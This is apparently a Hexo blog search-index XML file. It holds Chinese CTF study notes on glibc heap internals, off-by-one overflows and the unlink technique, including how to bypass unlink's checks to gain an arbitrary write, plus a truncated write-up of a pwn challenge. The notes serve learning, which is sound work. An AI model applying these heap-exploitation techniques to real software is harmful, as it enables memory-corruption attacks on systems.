<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Hello World</title>
    <url>/posts/0/</url>
    <content><![CDATA[<h1 id="Hello-World"><a href="#Hello-World" class="headerlink" title="Hello World"></a>Hello World</h1><h2 id="1-新建文章"><a href="#1-新建文章" class="headerlink" title="1 新建文章"></a>1 新建文章</h2><p>以hello world为例，在hexo目录下命令行输入<code>hexo new &quot;hello_world&quot;</code>，然后会在source的_posts目录下生成一个hello_world.md文件,在该markdown文件中就可以编辑这篇文章的内容了。编辑完成后刷新博客，博客里便会出现这篇文章，同时hexo也会直接为这篇文章生成一个页面。</p>
<h2 id="2-新建草稿"><a href="#2-新建草稿" class="headerlink" title="2 新建草稿"></a>2 新建草稿</h2><p>hexo默认配置是新建文章，所以如果需要新建一篇草稿，需要输入<code>hexo new draft &quot;文章名称&quot;</code>，然后再source的目录下会生成一个_drafts文件夹，里面会有所有新建的草稿，如果想要预览草稿，可以输入<code>hexo server --draft</code>命令来预览草稿文件</p>
<p>当草稿完成以后，可以通过输入<code>hexo publish &quot;文章名称&quot;</code>来发布草稿，然后这篇草稿会从_drafts中被删除，出现在_posts目录下。</p>
<h2 id="3-删除文章"><a href="#3-删除文章" class="headerlink" title="3 删除文章"></a>3 删除文章</h2><p>删除文章十分简单，只需要把_posts目录下需要删除的markdown删除，然后刷新博客之后这篇文章就不会出现在博客中了。</p>
<p>当然还有更多的教程可以直接去<a href="https://hexo.io/zh-cn/docs/writing.html">官网</a>学习。</p>
]]></content>
  </entry>
  <entry>
    <title>off by one</title>
    <url>/posts/a1c78337/</url>
    <content><![CDATA[<h1 id="off-by-one"><a href="#off-by-one" class="headerlink" title="off by one"></a>off by one</h1><p>off-by-one 是指单字节缓冲区溢出，这种漏洞的产生往往与边界验证不严和字符串操作有关，当然也不排除写入的 size 正好就只多了一个字节的情况。总之，是输入的范围超出申请的缓冲区的大小。</p>
<a id="more"></a>

<p>常见的边界验证不严谨有：</p>
<ul>
<li>使用循环语句向堆块中写入数据时，循环的次数设置错误（这在 C 语言初学者中很常见）导致多写入了一个字节。</li>
<li>字符串操作不合适</li>
</ul>
<p>off by one漏洞可以出现在各种缓冲区中，但ctf中常用于堆的题目。因此，主要是说明堆上的off by one。</p>
<h2 id="利用方向"><a href="#利用方向" class="headerlink" title="利用方向"></a>利用方向</h2><p>根据溢出字节是否可控分为两种情况：</p>
<ul>
<li>溢出字节为可控制任意字节：通过修改大小造成块结构之间出现重叠，从而泄露其他块数据，或是覆盖其他块数据。也可使用 NULL 字节溢出的方法</li>
<li>溢出字节为 NULL 字节：在 size 为 0x100 的时候，溢出 NULL 字节可以使得 <code>prev_in_use</code> 位被清，这样前块会被认为是 free 块。（1） 这时可以选择使用 unlink 方法（见 unlink 部分）进行处理。（2） 另外，这时 <code>prev_size</code> 域就会启用，就可以伪造 <code>prev_size</code> ，从而造成块之间发生重叠。此方法的关键在于 unlink 的时候没有检查按照 <code>prev_size</code> 找到的块的大小与<code>prev_size</code> 是否一致。</li>
</ul>
<p>这里的0x100是一个例子，原理是，申请chunk时对于申请大小不是2*size_sz的会自动补全，同时对于正在使用的chunk来说，<code>prev_size</code>是没有意义的，因此是与前一块chunk共用。</p>
<p>size为0x100，用户申请的大小是0xf8。补到0x100，由于chunk头需要0x10的空间，因此正常情况，用户的输入是可以到下一个chunk 的<code>prev_size</code>的。这时候溢出的null字节<code>\x00</code>会覆盖size的最低字节即 <code>prev_in_use</code>。</p>
<p>一个简单实验说明chunk的实际size大小。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *chunk1,*chunk2;</span><br><span class="line">    chunk1 = <span class="built_in">malloc</span>(<span class="number">56</span>);</span><br><span class="line">    chunk2 = <span class="built_in">malloc</span>(<span class="number">48</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/posts/a1c78337/image-20201116122936249.png" alt="image-20201116122936249"></p>
<p>无论是哪种情况，off by one本身很难实现攻击，一般只是为之后的攻击创造条件。</p>
<p>如实现堆交叉之后的UAF、修改<code>prev_in_use</code>之后使用unlink等。</p>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>heap</tag>
        <tag>offbyone</tag>
      </tags>
  </entry>
  <entry>
    <title>unlink原理</title>
    <url>/posts/c61eeb38/</url>
    <content><![CDATA[<h1 id="unlink-原理"><a href="#unlink-原理" class="headerlink" title="unlink 原理"></a>unlink 原理</h1><p>我们在利用 unlink 所造成的漏洞时，其实就是对 chunk 进行内存布局（伪造chunk等），然后借助 unlink 操作来达成修改指针的效果。</p>
<a id="more"></a>

<h2 id="unlink的过程"><a href="#unlink的过程" class="headerlink" title="unlink的过程"></a>unlink的过程</h2><p>unlink的目的是把一个双向链表中的空闲块拿出来。常用到的是在free当前chunk时，与物理相邻的chunk进行合并为一个大的chunk的情况。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> unlink(P, BK, FD)                                                     \</span></span><br><span class="line">&#123;                                                                             \</span><br><span class="line">  BK = P-&gt;bk;                                                                 \</span><br><span class="line">  FD = P-&gt;fd;                                                                 \</span><br><span class="line">  FD-&gt;bk = BK;                                                                \</span><br><span class="line">  BK-&gt;fd = FD;                                                                \</span><br><span class="line">&#125;                                                                             \</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>基本过程如图所示：</p>
<p><img src="/posts/c61eeb38/unlink_smallbin_intro.png" alt="img"></p>
<p>结果就是P和BK合并成一块chunk，其chunk头部在BK。</p>
<p>最开始的unlink如上代码所示，是没有进行检查。</p>
<p>而现在的unlink会对chunk 的 size 检查和双向链表检查。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 由于 P 已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致(size检查)</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="number">0</span>))      \</span><br><span class="line">      malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);               \</span><br><span class="line"><span class="comment">// 检查 fd 和 bk 指针(双向链表完整性检查)</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))                      \</span><br><span class="line">  malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P, AV);  \</span><br><span class="line"></span><br><span class="line">  <span class="comment">// largebin 中 next_size 双向链表完整性检查 </span></span><br><span class="line">              <span class="keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="number">0</span>)              \</span><br><span class="line">                || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="number">0</span>))    \</span><br><span class="line">              malloc_printerr (check_action,                                      \</span><br><span class="line">                               <span class="string">&quot;corrupted double-linked list (not small)&quot;</span>,    \</span><br><span class="line">                               P, AV);</span><br></pre></td></tr></table></figure>

<p>假设在没有检查的情况下，以32位为例子。</p>
<p><img src="/posts/c61eeb38/image-20201116175232943.png" alt="image-20201116175232943"></p>
<p>堆的状态如图，此时free（Q）。</p>
<ul>
<li>glibc 判断这个块是 small chunk</li>
<li>判断前向合并，发现前一个 chunk 处于使用状态，不需要前向合并</li>
<li>判断后向合并，发现后一个 chunk 处于空闲状态，需要合并</li>
<li>继而对 Nextchunk 采取 unlink 操作</li>
</ul>
<p>unlink的结果：</p>
<ul>
<li>FD=N-&gt;fd（即FD=a）</li>
<li>BK=N-&gt;bk（BK=b）</li>
<li>FD-&gt;bk = BK（<code>*（a+4*3）=b</code>）</li>
<li>BK-&gt;fd = FD（<code>*(b+4*2)=a</code>）</li>
</ul>
<p>如果能够修改N的fd和bk，如果将fd修改为目标地址-12（如某got）bk修改为期望的值（如另一个地址）。那么执通过FD-&gt;bk = BK就能做到修改目标地址的值的目的。</p>
<h3 id="绕过检查"><a href="#绕过检查" class="headerlink" title="绕过检查"></a>绕过检查</h3><p>但是由于会检查fd和bk指针，上述的修改方法就不成立了，使用伪造的方法。</p>
<p>首先我们通过覆盖，将 nextchunk 的 FD 指针指向了 fakeFD，将 nextchunk 的 BK 指针指向了 fakeBK 。那么为了通过验证，我们需要</p>
<ul>
<li><code>fakeFD -&gt; bk == P</code> &lt;=&gt; <code>*(fakeFD + 12) == P</code></li>
<li><code>fakeBK -&gt; fd == P</code> &lt;=&gt; <code>*(fakeBK + 8) == P</code></li>
</ul>
<p>当满足上述两式时，可以进入 Unlink 的环节，进行如下操作：</p>
<ul>
<li><code>fakeFD -&gt; bk = fakeBK</code> &lt;=&gt; <code>*(fakeFD + 12) = fakeBK</code></li>
<li><code>fakeBK -&gt; fd = fakeFD</code> &lt;=&gt; <code>*(fakeBK + 8) = fakeFD</code></li>
</ul>
<p>如果让 fakeFD + 12 和 fakeBK + 8 指向同一个指向P的指针，那么：</p>
<ul>
<li><code>*P = P - 8</code></li>
<li><code>*P = P - 12</code></li>
</ul>
<p>最终将p指针指向了比自己低12位的地址。</p>
<h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>条件：</p>
<ul>
<li><p>UAF ，可修改 free 状态下 smallbin 或是 unsorted bin 的 fd 和 bk 指针</p>
</li>
<li><p>已知位置存在一个指针指向可进行 UAF 的 chunk（通常是一个存储申请chunk的数组）</p>
</li>
</ul>
<p>条件并不绝对，也可以是通过溢出修改下一个chunk的prev_in_use、prev_size，unlink前一个伪造的chunk。</p>
<p>本质上，是将准备的free的chunk的物理相邻的free的chunk的fd、bk指针修改。</p>
<p>有了上述条件之后，那么就可以修改数组内容，如果有类似修改chunk内容的函数，就可以做到任意地址写。</p>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>heap</tag>
        <tag>unlink</tag>
      </tags>
  </entry>
  <entry>
    <title>unlink练习</title>
    <url>/posts/6cd531ad/</url>
    <content><![CDATA[<h1 id="unlink练习"><a href="#unlink练习" class="headerlink" title="unlink练习"></a>unlink练习</h1><p>记录ctf-wiki上的unlink练习题。</p>
<a id="more"></a>

]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>heap</tag>
        <tag>unlink</tag>
      </tags>
  </entry>
  <entry>
    <title>堆基础</title>
    <url>/posts/463ab4ed/</url>
    <content><![CDATA[<h1 id="堆基础知识"><a href="#堆基础知识" class="headerlink" title="堆基础知识"></a>堆基础知识</h1><p>在程序运行过程中，堆可以提供动态分配的内存，允许程序申请大小未知的内存。堆其实就是程序虚拟地址空间的一块连续的线性区域，它由低地址向高地址方向增长。一般称管理堆的那部分程序为堆管理器。不同操作系统对于堆的管理方式不尽相同，以下为ctf比赛中常用的Linux的堆基础知识。</p>
<a id="more"></a>

<h2 id="堆管理的基本结构"><a href="#堆管理的基本结构" class="headerlink" title="堆管理的基本结构"></a>堆管理的基本结构</h2><p>堆的管理主要涉及两个，堆表和堆块。堆区（heap）的内存都以堆块为单位进行分配存储，堆块有堆身和堆首，堆首记录堆块的信息，如大小、是否空闲等，堆身存储数据。堆表一般位于堆区的开始，用于存储所有堆块的重要信息，如大小、是否可用、位置等。</p>
<h3 id="堆块"><a href="#堆块" class="headerlink" title="堆块"></a>堆块</h3><p>在glibc中，堆管理器为<strong>ptmalloc2</strong>。申请堆使用函数malloc,将由malloc申请的内存称为chunk</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  malloc(size_t n)</span></span><br><span class="line"><span class="comment">  Returns a pointer to a newly allocated chunk of at least n bytes, or null</span></span><br><span class="line"><span class="comment">  if no space is available. Additionally, on failure, errno is</span></span><br><span class="line"><span class="comment">  set to ENOMEM on ANSI C systems.</span></span><br><span class="line"><span class="comment">  If n is zero, malloc returns a minumum-sized chunk. (The minimum</span></span><br><span class="line"><span class="comment">  size is 16 bytes on most 32bit systems, and 24 or 32 bytes on 64bit</span></span><br><span class="line"><span class="comment">  systems.)  On most systems, size_t is an unsigned type, so calls</span></span><br><span class="line"><span class="comment">  with negative arguments are interpreted as requests for huge amounts</span></span><br><span class="line"><span class="comment">  of space, which will often fail. The maximum supported value of n</span></span><br><span class="line"><span class="comment">  differs across systems, but is in all cases less than the maximum</span></span><br><span class="line"><span class="comment">  representable value of a size_t.</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>



<p>malloc函数返回对应申请的大小字节的内存块的指针（不包括chunk头）。同时还有异常处理：</p>
<ul>
<li>当 n=0 时，返回当前系统允许的堆的最小内存块。</li>
<li>当 n 为负数时，由于在大多数系统上，<strong>size_t 是无符号数（这一点非常重要）</strong>，所以程序就会申请很大的内存空间，但通常来说都会失败，因为系统没有那么多的内存可以分配。</li>
</ul>
<p>另外，malloc调用时输入的n是用户空间大小，即是堆身大小。</p>
<p>chunk的结构都是统一的</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  This struct declaration is misleading (but accurate and necessary).</span></span><br><span class="line"><span class="comment">  It declares a &quot;view&quot; into memory allowing access to necessary</span></span><br><span class="line"><span class="comment">  fields at known offsets from a given base. See explanation below.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T      prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><img src="/posts/463ab4ed/RlseGG7.png"></p>
<p>关于INTERNAL_SIZE_T的说明:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* INTERNAL_SIZE_T is the word-size used for internal bookkeeping of</span></span><br><span class="line"><span class="comment">   chunk sizes.</span></span><br><span class="line"><span class="comment">   The default version is the same as size_t.</span></span><br><span class="line"><span class="comment">   While not strictly necessary, it is best to define this as an</span></span><br><span class="line"><span class="comment">   unsigned type, even if size_t is a signed type. This may avoid some</span></span><br><span class="line"><span class="comment">   artificial size limitations on some systems.</span></span><br><span class="line"><span class="comment">   On a 64-bit machine, you may be able to reduce malloc overhead by</span></span><br><span class="line"><span class="comment">   defining INTERNAL_SIZE_T to be a 32 bit `unsigned int&#x27; at the</span></span><br><span class="line"><span class="comment">   expense of not being able to handle more than 2^32 of malloced</span></span><br><span class="line"><span class="comment">   space. If this limitation is acceptable, you are encouraged to set</span></span><br><span class="line"><span class="comment">   this unless you are on a platform requiring 16byte alignments. In</span></span><br><span class="line"><span class="comment">   this case the alignment requirements turn out to negate any</span></span><br><span class="line"><span class="comment">   potential advantages of decreasing size_t word size.</span></span><br><span class="line"><span class="comment">   Implementors: Beware of the possible combinations of:</span></span><br><span class="line"><span class="comment">     - INTERNAL_SIZE_T might be signed or unsigned, might be 32 or 64 bits,</span></span><br><span class="line"><span class="comment">       and might be the same width as int or as long</span></span><br><span class="line"><span class="comment">     - size_t might have different width and signedness as INTERNAL_SIZE_T</span></span><br><span class="line"><span class="comment">     - int and long might be 32 or 64 bits, and might be the same width</span></span><br><span class="line"><span class="comment">   To deal with this, most comparisons and difference computations</span></span><br><span class="line"><span class="comment">   among INTERNAL_SIZE_Ts should cast them to unsigned long, being</span></span><br><span class="line"><span class="comment">   aware of the fact that casting an unsigned int to a wider long does</span></span><br><span class="line"><span class="comment">   not sign-extend. (This also makes checking for negative numbers</span></span><br><span class="line"><span class="comment">   awkward.) Some of these casts result in harmless compiler warnings</span></span><br><span class="line"><span class="comment">   on some systems.  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> INTERNAL_SIZE_T</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> INTERNAL_SIZE_T size_t</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* The corresponding word size.  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SIZE_SZ (sizeof (INTERNAL_SIZE_T))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* The corresponding bit mask value.  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MALLOC_ALIGN_MASK (MALLOC_ALIGNMENT - 1)</span></span><br></pre></td></tr></table></figure>

<p>因此，一般为64位的无符整数或32位的</p>
<ul>
<li> prev_size 前一个（物理相邻，较低地址的chunk）的大小，free时有用。包括了chunk头。</li>
<li>size当前chunk的大小，一定是2*size_sz的整数倍，因此最后3位的值对于大小没有影响，从高到低分别表示<ul>
<li>NON_MAIN_ARENA，记录当前 chunk 是否不属于主线程，1表示不属于，0表示属于</li>
<li>IS_MAPPED，记录当前 chunk 是否是由 mmap 分配的</li>
<li>PREV_INUSE，记录前一个 chunk 块是否被分配。1为被分配，每个chunk创建时都默认置1,为0时表示空闲。</li>
</ul>
</li>
<li><strong>fd，bk</strong>。 chunk 处于分配状态时，从 fd 字段开始是用户的数据。chunk 空闲时，会被添加到对应的空闲管理链表中，其字段的含义如下:<ul>
<li>fd 指向下一个（非物理相邻）空闲的 chunk</li>
<li>bk 指向上一个（非物理相邻）空闲的 chunk</li>
<li>通过 fd 和 bk 可以将空闲的 chunk 块加入到空闲的 chunk 块链表进行统一管理</li>
</ul>
</li>
<li><strong>fd_nextsize， bk_nextsize</strong>，也是只有 chunk 空闲的时候才使用，不过其用于较大的 chunk（large chunk）。<ul>
<li>fd_nextsize 指向前一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针。</li>
<li>bk_nextsize 指向后一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针。</li>
<li>一般空闲的 large chunk 在 fd 的遍历顺序中，按照由大到小的顺序排列。<strong>这样做可以避免在寻找合适chunk 时挨个遍历。</strong></li>
</ul>
</li>
</ul>
<p><strong>一般情况下</strong>，<strong>物理相邻</strong>的两个空闲 chunk 会被合并为一个 chunk 。堆管理器会通过 prev_size 字段以及 size 字段合并两个物理相邻的空闲 chunk 块。（unlink）</p>
<h3 id="bin"><a href="#bin" class="headerlink" title="bin"></a>bin</h3><p>释放的chunk不会马上归还给系统，ptmalloc会回收统一管理，当之后用户在申请内存时，就会先在这些回收的chunk中尽量找合适的给用户。以避免频繁的系统调用，降低开销。</p>
<p>ptmalloc根据chunk的大小分为4类：fast bins、small bins、large bins、unsorted bin。在每个类中大小相似的会用链表连接起来。</p>
<p><img src="https://img-blog.csdnimg.cn/20190724161429389.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNDUzMjg1,size_16,color_FFFFFF,t_70" alt="img"></p>
<p>对于 small bins，large bins，unsorted bin 来说，ptmalloc 将它们维护在同一个数组中。这些bin对应的数据结构在 malloc_state 中，如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> &#123;</span></span><br><span class="line">    <span class="comment">/* Serialize access.  */</span></span><br><span class="line">    __libc_lock_define(, mutex);  <span class="comment">/* Flags (formerly in max_fast).  */</span></span><br><span class="line">    <span class="keyword">int</span> flags;   <span class="comment">/* Fastbins */</span></span><br><span class="line">    mfastbinptr fastbinsY[ NFASTBINS ];    <span class="comment">/* Base of the topmost chunk -- not otherwise kept in a bin */</span></span><br><span class="line">    mchunkptr top;    <span class="comment">/* The remainder from the most recent split of a small request */</span></span><br><span class="line">    mchunkptr last_remainder;    <span class="comment">/* Normal bins packed as described above */</span></span><br><span class="line">    mchunkptr bins[ NBINS * <span class="number">2</span> - <span class="number">2</span> ];    <span class="comment">/* Bitmap of bins, help to speed up the process of determinating if a given bin is definitely empty.*/</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> binmap[ BINMAPSIZE ];    <span class="comment">/* Linked list, points to the next arena */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next</span>;</span>    <span class="comment">/* Linked list for free arenas.  Access to this field is serialized</span></span><br><span class="line"><span class="comment">       by free_list_lock in arena.c.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next_free</span>;</span>    <span class="comment">/* Number of threads attached to this arena.  0 if the arena is on</span></span><br><span class="line"><span class="comment">       the free list.  Access to this field is serialized by</span></span><br><span class="line"><span class="comment">       free_list_lock in arena.c.  */</span></span><br><span class="line">    INTERNAL_SIZE_T attached_threads;    <span class="comment">/* Memory allocated from the system in this arena.  */</span></span><br><span class="line">    INTERNAL_SIZE_T system_mem;</span><br><span class="line">    INTERNAL_SIZE_T max_system_mem;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>注意： malloc_state不在堆段，而是一个全局变量存在数据段中</p>
<p>数组中的 bin 依次如下</p>
<ol>
<li>第一个为 unsorted bin，字如其面，这里面的 chunk 没有进行排序，存储的 chunk 比较杂。</li>
<li>索引从 2 到 63 的 bin 称为 small bin，同一个 small bin 链表中的 chunk 的大小相同。两个相邻索引的 small bin 链表中的 chunk 大小相差的字节数为<strong>2个机器字长</strong>，即32位相差8字节，64位相差16字节。</li>
<li>small bins 后面的 bin 被称作 large bins。large bins 中的每一个 bin 都包含一定范围内的 chunk，其中的chunk 按 fd 指针的顺序从大到小排列。相同大小的chunk同样按照最近使用顺序排列。</li>
</ol>
<p>此外，上述这些bin的排布都会遵循一个原则：<strong>任意两个物理相邻的空闲chunk不能在一起</strong></p>
<h4 id="fast-bin"><a href="#fast-bin" class="headerlink" title="fast bin"></a>fast bin</h4><p>对于一些小的chunk释放后<strong>优先</strong>放到fast bin中，为了避免小的chunk和相邻空闲chunk合并，下一次再申请需要堆chunk进行分割的情况。</p>
<p>fastbin所包含chunk的大小为16 Bytes, 24 Bytes, 32 Bytes, … , 80 Bytes。当分配一块较小的内存(mem&lt;=64 Bytes)时，会首先检查对应大小的fastbin中是否包含未被使用的chunk，如果存在则直接将其从fastbin中移除并返回；否则通过其他方式（剪切top chunk）得到一块符合大小要求的chunk并返回。</p>
<p><img src="https://i.imgur.com/KYQmNPN.png" alt="img"></p>
<p>如图所示fastbin的特性有：</p>
<ul>
<li>用单链表维护释放的堆块</li>
<li>链表采用先进后出的方式，最近释放的 chunk 会更早地被分配，所以会更加适合于局部性。</li>
<li>不会对free的chunk进行合并。</li>
</ul>
<h4 id="small-bin"><a href="#small-bin" class="headerlink" title="small bin"></a>small bin</h4><p>mall bins 中每个 chunk 的大小与其所在的 bin 的 index 的关系为：chunk_size = 2 * SIZE_SZ *index，具体如下</p>
<table>
<thead>
<tr>
<th>下标</th>
<th align="center">SIZE_SZ=4（32位）</th>
<th align="center">SIZE_SZ=8（64位）</th>
</tr>
</thead>
<tbody><tr>
<td>2</td>
<td align="center">16</td>
<td align="center">32</td>
</tr>
<tr>
<td>3</td>
<td align="center">24</td>
<td align="center">48</td>
</tr>
<tr>
<td>4</td>
<td align="center">32</td>
<td align="center">64</td>
</tr>
<tr>
<td>……</td>
<td align="center">……</td>
<td align="center">……</td>
</tr>
<tr>
<td>63</td>
<td align="center">504</td>
<td align="center">1008</td>
</tr>
</tbody></table>
<p>small bin的特性：</p>
<ul>
<li>采用循环双向链表</li>
<li>采用FIFO</li>
<li>small的free比较特殊。当释放small chunk的时候，先检查该chunk相邻的chunk是否为free，如果是的话就进行合并操作：将这些chunks合并成新的chunk，然后将它们从small bin中移除，最后将新的chunk添加到unsorted bin中，之后unsorted bin进行整理再添加到对应的bin链上。</li>
<li>与fast bin大小重合的部分，是有可能放入fast bin中的chunk的。</li>
</ul>
<h4 id="large-bin"><a href="#large-bin" class="headerlink" title="large bin"></a>large bin</h4><p>large bins 中一共包括 63 个 bin，每个 bin 中的 chunk 的大小不一致，而是处于一定区间范围内。此外，这 63 个 bin 被分成了 6 组，每组 bin 中的 chunk 大小之间的公差一致，具体如下：</p>
<table>
<thead>
<tr>
<th align="left">组</th>
<th align="center">数量</th>
<th align="center">公差</th>
</tr>
</thead>
<tbody><tr>
<td align="left">1</td>
<td align="center">32</td>
<td align="center">64B</td>
</tr>
<tr>
<td align="left">2</td>
<td align="center">16</td>
<td align="center">512B</td>
</tr>
<tr>
<td align="left">3</td>
<td align="center">8</td>
<td align="center">4096B</td>
</tr>
<tr>
<td align="left">4</td>
<td align="center">4</td>
<td align="center">32768B</td>
</tr>
<tr>
<td align="left">5</td>
<td align="center">2</td>
<td align="center">262144B</td>
</tr>
<tr>
<td align="left">6</td>
<td align="center">1</td>
<td align="center">不限制</td>
</tr>
</tbody></table>
<h4 id="unsorted-bin"><a href="#unsorted-bin" class="headerlink" title="unsorted bin"></a>unsorted bin</h4><p>unsorted bin 可以视为空闲 chunk 回归其所属 bin 之前的缓冲区。</p>
<p>unsorted bin中的chunk处于乱序状态。</p>
<p>当 fast bin、small bin 中的 chunk 都不能满足用户请求 chunk 大小时，堆管理器就会考虑使用 unsorted bin 。它会在分配 large chunk 之前对堆中碎片 chunk 进行合并，以便减少堆中的碎片。</p>
<p>特性：</p>
<ul>
<li>unsorted bin是一个由free chunks组成的循环双链表</li>
<li>在unsorted bin中，对chunk的大小并没有限制，任何大小的chunk都可以归属到unsorted bin中</li>
<li>unsortedbin采用的遍历顺序是FIFO</li>
</ul>
<h3 id="top-chunk"><a href="#top-chunk" class="headerlink" title="top chunk"></a>top chunk</h3><p>程序第一次进行 malloc 的时候，heap 会被分为两块，一块给用户，剩下的那块就是 top chunk。其实，所谓的top chunk 就是处于当前堆的物理地址最高的 chunk。这个 chunk 不属于任何一个 bin，它的作用在于当所有的bin 都无法满足用户请求的大小时，如果其大小不小于指定的大小，就进行分配，并将剩下的部分作为新的 top chunk。否则，就对heap进行扩展后再进行分配。在main arena中通过sbrk扩展heap，而在thread arena中通过mmap分配新的heap。</p>
<p>需要注意的是，top chunk 的 prev_inuse 比特位始终为1，否则其前面的chunk就会被合并到top chunk中。</p>
<h2 id="相关系统调用"><a href="#相关系统调用" class="headerlink" title="相关系统调用"></a>相关系统调用</h2><p>malloc、free函数背后的系统调用主要是(s)brk、mmap、munmap函数。</p>
<p><img src="/posts/463ab4ed/brk&mmap.png" alt="img"></p>
<h3 id="s-brk"><a href="#s-brk" class="headerlink" title="(s)brk"></a>(s)brk</h3><p>对于堆的操作，操作系统提供了 brk 函数，glibc 库提供了 sbrk 函数，我们可以通过增加 brk 的大小来向操作系统申请内存。</p>
<p>brk和sbrk是在Unix和类Unix操作系统中使用的基本内存管理系统调用，用于控制分配给进程数据段的内存量。</p>
<p>初始时，堆的起始地址 start_brk 以及堆的当前末尾 brk 指向同一地址。根据是否开启ASLR，两者的具体位置会有所不同</p>
<ul>
<li>不开启ASLR：start_brk 以及 brk 会指向 data/bss 段的结尾。</li>
<li>开启ASLR：start_brk 以及 brk 也会指向同一位置，只是这个位置是在 data/bss 段结尾后的随机偏移处。</li>
</ul>
<p><img src="/posts/463ab4ed/program_virtual_address_memory_space.png" alt="img"></p>
<h3 id="mmap"><a href="#mmap" class="headerlink" title="mmap"></a>mmap</h3><p>malloc 会使用 mmap来创建独立的匿名映射段。匿名映射的目的主要是可以申请以0填充的内存，并且这块内存仅被调用进程所使用。</p>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>heap</tag>
      </tags>
  </entry>
  <entry>
    <title>攻防世界pwn进阶</title>
    <url>/posts/5600bec/</url>
    <content><![CDATA[<h1 id="攻防世界——pwn进阶"><a href="#攻防世界——pwn进阶" class="headerlink" title="攻防世界——pwn进阶"></a>攻防世界——pwn进阶</h1><p>攻防世界的pwn进阶题目的记录</p>
<a id="more"></a>

<h2 id="1-forgot"><a href="#1-forgot" class="headerlink" title="1.forgot"></a>1.forgot</h2><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201220180827121.png" alt="image-20201220180827121"><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201216091450390.png" alt="image-20201216091450390"></p>
<h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201216091522087.png" alt="image-20201216091522087"></p>
<p>发现scanf是一个溢出点，没有限制输入的大小。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201216091600591.png" alt="image-20201216091600591">在主函数的最后是调用调用 (指针v3 + (v14 - 1))所指向的函数。</p>
